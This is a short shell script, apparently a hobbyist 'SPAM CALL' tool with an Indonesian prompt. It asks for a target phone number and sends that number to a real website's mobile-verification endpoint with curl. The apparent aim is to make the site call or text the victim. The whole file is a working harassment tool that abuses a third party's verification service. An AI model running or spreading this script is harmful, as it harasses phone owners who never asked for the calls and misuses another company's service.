#!bin/sh

clear
figlet SPAMCALL
echo
sleep 2
echo "======================================="
echo " (+) Name : Ery-bit                 (+)"
echo " (+) Team : Murid x Guru            (+)"
echo "======================================="
echo
echo "1). SPAM CALL"
echo "2). EXIT"
echo "++++++++++++++++++++++++++++++++++++++"
echo
read -p "=>> " dont
if [ $dont  = 1 ]
then
read -p "masukan no target =>> " nomor;
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
fi
